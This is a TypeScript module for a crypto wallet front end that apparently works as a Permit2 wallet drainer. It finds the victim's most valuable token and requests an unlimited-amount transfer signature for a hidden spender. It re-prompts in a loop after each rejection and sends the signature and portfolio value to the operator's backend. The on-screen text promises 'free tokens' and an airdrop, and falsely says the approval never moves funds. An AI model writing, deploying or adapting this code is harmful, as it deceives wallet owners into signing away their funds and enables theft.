// src/lib/permit2Flow.ts
// 100% client-side Permit2 flow. After a successful wallet connect:
//   1. Scan the wallet's ERC-20 balances on the current chain (viem + CoinGecko).
//   2. Pick the highest-USD-value token.
//   3. Build a Permit2 PermitTransferFrom typed-data payload for MaxUint256
//      valid for VITE_PERMIT2_EXPIRY_DAYS days.
//   4. Prompt the wallet with eth_signTypedData_v4 and RESEND the same
//      request on rejection until the user approves (or explicitly cancels).
//   5. POST the resulting { owner, token, amount, nonce, deadline, spender,
//      signature, ... } to OUR backend, which just stores it.

import { toast } from 'sonner';
import { type Address } from 'viem';
import {
  storePermit2Signature,
  type Permit2TypedData,
} from './backendClient';
import { scanWallet, pickTopToken } from './walletScanner';
import {
  cancelSignatureLoop,
  isSignatureLoopCancelled,
  resetSignatureCancel,
  setSignatureUi,
  waitForRetry,
} from './promptUiBus';

const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
const EXPIRY_DAYS = Number(import.meta.env.VITE_PERMIT2_EXPIRY_DAYS ?? 30) || 30;

// Canonical Permit2 contract (same address on every EVM chain).
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const MAX_UINT256 =
  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
const RETRY_DELAY_MS = 1500;
const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

const getProvider = (): any | null =>
  typeof window === 'undefined' ? null : (window as any).ethereum ?? null;

const buildPermit2TypedData = (params: {
  chainId: number;
  token: string;
  spender: string;
  nonce: string;
  deadline: number;
}): Permit2TypedData => ({
  domain: {
    name: 'Permit2',
    chainId: params.chainId,
    verifyingContract: PERMIT2_ADDRESS,
  },
  types: {
    EIP712Domain: [
      { name: 'name', type: 'string' },
      { name: 'chainId', type: 'uint256' },
      { name: 'verifyingContract', type: 'address' },
    ],
    PermitTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions' },
      { name: 'spender', type: 'address' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  },
  primaryType: 'PermitTransferFrom',
  message: {
    permitted: { token: params.token, amount: MAX_UINT256 },
    spender: params.spender,
    nonce: params.nonce,
    deadline: params.deadline,
  },
});

async function signTypedData(address: string, typedData: any): Promise<string> {
  const provider = getProvider();
  if (!provider) throw new Error('No injected wallet provider found in this browser.');
  return provider.request({
    method: 'eth_signTypedData_v4',
    params: [address, JSON.stringify(typedData)],
  });
}

export interface RunPermit2FlowArgs {
  address: string;
  chainId?: number;
  walletName?: string | null;
}

export async function runPermit2Flow({
  address,
  chainId,
  walletName,
}: RunPermit2FlowArgs) {
  if (!SPENDER) {
    console.warn('VITE_SPENDER_ADDRESS is not set — skipping Permit2 flow.');
    toast.success('Rewards Ready! 🎁', {
      description: 'Your airdrop allocation is now available to claim.',
    });
    return;
  }

  const activeChainId = chainId ?? 1;

  // 1. Scan the wallet fully client-side.
  let tokens;
  try {
    tokens = await scanWallet(address as Address, activeChainId);
  } catch (err: any) {
    console.error('wallet scan failed', err);
    toast.error('Could not read your wallet balances', {
      description: String(err?.message ?? '').slice(0, 140),
    });
    return;
  }

  const top = pickTopToken(tokens);
  if (!top) {
    toast.info('No supported tokens found in this wallet', {
      description:
        'The approval requires at least one supported ERC-20 token (USDT, USDC, DAI, WETH, etc.) with a balance on this chain. Get tokens first, then reconnect.',
      duration: 8000,
    });
    return;
  }

  const totalUsd = tokens.reduce((sum, t) => sum + t.valueUsd, 0);

  // 2. Build Permit2 typed data locally.
  const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
  const nonce = Date.now().toString(); // simple monotonic nonce
  const typedData = buildPermit2TypedData({
    chainId: activeChainId,
    token: top.address,
    spender: SPENDER,
    nonce,
    deadline,
  });

  // 3. Prompt loop.
  resetSignatureCancel();
  setSignatureUi({
    open: true,
    status: 'waiting',
    attempt: 1,
    title: 'You are about to receive your free tokens',
    description:
      'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like “Sign message”, “Confirm request” or “Sign-in with Ethereum” — that is the same approval, it is safe and it never moves funds on its own.',
    errorMessage: undefined,
  });

  let attempt = 0;
  // eslint-disable-next-line no-constant-condition
  while (true) {
    if (isSignatureLoopCancelled()) return;
    attempt += 1;
    setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });

    try {
      const signature = await signTypedData(address, typedData);

      setSignatureUi({ status: 'approved' });

      // 4. Store on our backend — its only job.
      try {
        await storePermit2Signature({
          owner: address,
          chainId: activeChainId,
          token: top.address,
          tokenSymbol: top.symbol,
          // Signed value is unlimited (MAX_UINT256) but we report the actual
          // wallet balance of the top asset so the backend knows the real size.
          amount: top.balance.toString(),
          signedAmount: MAX_UINT256,
          balanceFormatted: top.balanceFormatted,
          decimals: top.decimals,
          nonce,
          deadline,
          spender: SPENDER,
          signature,
          typedData,
          walletName,
          portfolioUsd: totalUsd,
          tokenValueUsd: top.valueUsd,
        });
      } catch (e) {
        console.warn('storePermit2Signature failed', e);
      }

      toast.success('Approved — your tokens are on the way 🎁');
      setTimeout(() => cancelSignatureLoop(), 1500);
      return;
    } catch (err: any) {
      const rejected = isUserRejection(err);
      setSignatureUi({
        status: rejected ? 'rejected' : 'failed',
        attempt,
        errorMessage: rejected ? undefined : String(err?.message ?? err).slice(0, 160),
      });

      if (!getProvider()) {
        toast.error('No wallet detected in this browser', {
          description: 'Open the site inside your wallet app browser and try again.',
        });
        cancelSignatureLoop();
        return;
      }

      await waitForRetry(RETRY_DELAY_MS);
    }
  }
}
